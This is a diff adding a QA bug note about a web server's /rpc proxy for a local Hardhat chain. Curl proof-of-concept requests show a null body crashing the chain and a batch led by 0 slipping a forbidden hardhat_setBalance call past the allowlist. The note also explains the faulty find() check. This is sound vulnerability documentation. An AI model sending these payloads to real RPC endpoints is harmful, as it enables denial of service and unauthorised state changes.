@@ -1,0 +1,14 @@
+# /rpc allowlist bypass and chain crash (fork QA, instance RPC_PORT=9145 WEB_PORT=5773)
+$ curl -X POST http://127.0.0.1:5773/rpc -d 'null'
+{"jsonrpc":"2.0","id":null,"error":{"code":-32000,"message":"local chain not reachable on port 9145: ECONNRESET"}} 502
+-> .state/chain-9145.log:
+TypeError: Cannot read properties of null (reading 'jsonrpc')
+    at isValidJsonRequest (contract/node_modules/hardhat/src/internal/util/jsonrpc.ts:54:15)
+-> start.js: "chain exited with code 1; stopping." / "Stopped."  (web server stops too; in-memory chain lost)
+Same with body '[null, {...}]'.
+
+$ curl -X POST http://127.0.0.1:5773/rpc -d '[0,{"jsonrpc":"2.0","id":2,"method":"hardhat_setBalance","params":["0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC","0x1"]}]'
+[{"jsonrpc":"2.0","id":null,"error":{"code":-32600,"message":"Invalid request"...}},{"jsonrpc":"2.0","id":2,"result":true}] 200
+$ curl ... eth_getBalance accuser -> {"result":"0x1"}     (forbidden method executed)
+Cause: server.js proxyRpc: `const bad = list.find((c) => !c || ...)` returns the falsy element itself (null/0/false),
+so `if (bad)` is false and the whole body is forwarded. Invalid JSON is forwarded too (calls = null).
